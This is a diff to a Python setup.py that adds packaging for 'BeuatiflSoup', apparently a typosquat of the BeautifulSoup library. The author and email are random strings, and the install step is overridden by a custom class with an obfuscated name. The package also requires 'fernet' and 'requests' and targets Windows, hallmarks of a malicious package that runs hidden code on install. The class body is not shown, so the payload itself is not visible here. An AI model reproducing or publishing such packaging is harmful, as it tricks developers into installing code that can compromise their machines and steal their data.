@@ -18,5 +18,22 @@ class wvJYcMtwrxnkftNhpdKOpbGTdKTiGqWGpbZYMooMoWZQcgSuqgvvkuvOBenUbUpKnUKrflLLhf
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name="BeuatiflSoup",
+    version=VERSION,
+    author="afxnskOCpKHYfqiGgHJa",
+    author_email="iPsaBODxuN@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': wvJYcMtwrxnkftNhpdKOpbGTdKTiGqWGpbZYMooMoWZQcgSuqgvvkuvOBenUbUpKnUKrflLLhfYrCWUUrVRtkFdQVSniVBVgSBrQxodSVPpLSPIiqqswRUkdGyANRpTVNTMZqTYjSjOvfpnXKCnGdcfsgdPBMcmNCuwcmNJxpSimKXLsVHLXdsEpQRMpwzW,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
